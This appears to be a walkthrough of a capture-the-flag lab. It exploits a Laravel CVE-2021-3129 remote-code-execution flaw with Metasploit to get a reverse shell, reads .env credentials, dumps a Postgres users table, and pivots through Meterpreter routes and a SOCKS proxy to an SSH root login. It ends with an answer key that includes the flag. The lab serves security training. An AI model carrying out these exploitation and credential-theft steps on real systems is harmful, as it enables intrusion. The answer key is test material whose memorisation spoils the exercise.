# Day_09 [Pivoting] Dock the halls

+ Deployable Website: No
+ Deployable Container: Yes

Description: Because of the recent incident, Santa has asked his team to set up a new web application that runs on Docker. It's supposed to be much more secure than the previous one, but better safe than sorry, right? It's up to you, McSkidy, to show Santa that there may be hidden weaknesses before the bad guys find them!

> IP = 10.10.7.242

## LEARNING OBJECTIVES

+ Using Metasploit modules and Meterpreter to compromise systems
+ Network Pivoting
+ Post exploitation

## NOTES

## STEPS

1. Start machine
2. Run Nmap
   1. > nmap -T4 -A -Pn 10.10.7.242 -oN initial
      1. We see port 80/tcp open  http apache
3. Find the Framework
   1. 10.10.7.242:80
   2. Inspect page
      1. Looking at the code towards the bottom we see `Laravel` which is a PHP framework
4. Run MSFCONSOLE
   1. > msfconsole
      1. > search laravel
         1. This returns two potential exploits
            1. exploit/unix/http/laravel_token_unserialize_exec
            2. exploit/multi/php/ignition_laravel_debug_rce
         2. Search for laravel CVE's
            1. If we google laravel 8.4.2 we can see the CVE `CVE-2021-3129`
         3. Lets use the ignition exploit
            1. > use multi/php/ignition_laravel_debug_rce
         4. Make sure we know what settings are needed
            1. > info

               ```msfconsole
                  Name       Current Setting              Required  Description
                  ----       ---------------              --------  -----------
                  LOGFILE                                 no        Laravel log file absolute path
                  Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
                  RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
                  RPORT      80                           yes       The target port (TCP)
                  SSL        false                        no        Negotiate SSL/TLS for outgoing connections
                  TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
                  VHOST                                   no        HTTP server virtual host


                  Payload options (cmd/unix/reverse_bash):

                  Name   Current Setting  Required  Description
                  ----   ---------------  --------  -----------
                  LHOST                   yes       The listen address (an interface may be specified)
                  LPORT  4444             yes       The listen port


                  Exploit target:

                  Id  Name
                  --  ----
                  0   Unix (In-Memory)
               ```

            2. We need to use the set rhost and lets set the verbosity
            3. > set rhost 10.10.7.242
            4. > set verbose true
            5. > set lshosy MY_IP
            6. > check
            7. > run
               1. We now have a reverse shell
      2. Reverse-Shell
         1. > whoami
            1. RESPONSE: www-data
         2. Background this shell
            1. > background
            2. > y
         3. Upgrade shell to meterpreter
            1. > sessions -i -1
      3. Navigate / investigate the file system
         1. > pwd
            1. /var/www/html
         2. > ls
            1. .htaccess, favicon.ico, index.php, robots.txt, web.config
         3. > cat web.config
            1. Nothing crazy
         4. > cd ..
         5. > ls
            1. In here we see an environment file `.env`
         6. > cat .env
            1. In here we can see credentials  including database passwords
      4. Meterpreter
         1. Lets go back to meterpreter and run the resolve webservice_database
         2. > resolve webservice_database
            1. This gives us `webservice_database  172.28.101.51`
         3. Using meterpreter lets add this route
            1. > background
            2. > route add 172.28.101.51/32 -1
            3. > route add 172.17.0.1/32 -1
      5. Target Database
         1. Now that we have the route we can use metasploit modules to target the postgres database
         2. DUMP SCHEMA
            1. > use auxiliary/scanner/postgres/postgres_schemadump
            2. > run postgres://postgres:postgres@172.28.101.51/postgres
               1. This gives us the output:

                  ```text
                     [*] 172.28.101.51:5432 - Found databases: postgres, template1, template0. Ignoring template1, template0.
                     [+] Postgres SQL Server Schema 
                     Host: 172.28.101.51 
                     Port: 5432 
                     ====================

                     ---
                     - DBName: postgres
                     Tables:
                     - TableName: users_id_seq
                        Columns:
                        - ColumnName: last_value
                           ColumnType: int8
                           ColumnLength: '8'
                        - ColumnName: log_cnt
                           ColumnType: int8
                           ColumnLength: '8'
                        - ColumnName: is_called
                           ColumnType: bool
                           ColumnLength: '1'
                     - TableName: users
                        Columns:
                        - ColumnName: id
                           ColumnType: int4
                           ColumnLength: '4'
                        - ColumnName: username
                           ColumnType: varchar
                           ColumnLength: "-1"
                        - ColumnName: password
                           ColumnType: varchar
                           ColumnLength: "-1"
                        - ColumnName: created_at
                           ColumnType: timestamp
                           ColumnLength: '8'
                        - ColumnName: deleted_at
                           ColumnType: timestamp
                           ColumnLength: '8'
                     - TableName: users_pkey
                        Columns:
                        - ColumnName: id
                           ColumnType: int4
                        ColumnLength: '4'
                  ```

         3. Try to select info from tables
            1. > use auxiliary/admin/postgres/postgres_sql
            2. > run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
               1. This gives us the output:

                  ```text
                     Query Text: 'select * from users'
                     =================================

                        id  username  password  created_at                  deleted_at
                        --  --------  --------  ----------                  ----------
                        1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL
                  ```

               2. This gives us a `user` = `santa` & `password` = `p4$$w0rd`
      6. Socks Proxy
         1. To pivot further lets use metasploit with the socks_proxy function
            1. > use auxiliary/server/socks_proxy
            2. > run srvhost=127.0.0.1 srvport=9050 version=4a
         2. Now we can use this to expose a port on the attacker machine that can be used to run other network tools through, such as curl or proxychains
            1. > curl --proxy socks4a://localhost:9050 'http://172.17.0.1' -v
      7. SSH
         1. Now lets use msfconsole's tools to SSH into the machine with the credentials we got earlier
         2. > use auxiliary/scanner/ssh/ssh_login
         3. > run ssh://santa:p4$$w0rd@172.17.0.1
         4. Now if we run `sessions` again we can see `SHELL-LINUX` entry
         5. Now lets switch our session to the new one
            1. > sessions -i -1
            2. WE ARE IN!
      8. Get Flag
         1. > whoami
            1. RESPONSE: `root`
         2. > cat root.txt
            1. RESPONSE: `THM{47C61A0FA8738BA77308A8A600F88E4B}`

## QUESTIONS

1. Deploy the attached VM, and wait a few minutes. What ports are open?
   1. `80`
2. What framework is the web application developed with?
   1. `Laravel`
3. What CVE is the application vulnerable to?
   1. `CVE-2021-3129`
4. What command can be used to upgrade the last opened session to a Meterpreter session?
   1. `sessions -u -1`
5. What file indicates a session has been opened within a Docker container?
   1. `/.dockerenv`
6. What file often contains useful credentials for web applications?
   1. `.env`
7. What database table contains useful credentials?
   1. `users`
8. What is Santa's password?
   1. `p4$$w0rd`
9. What ports are open on the host machine?
   1. `22,80`
10. What is the root flag?
    1. `THM{47C61A0FA8738BA77308A8A600F88E4B}`
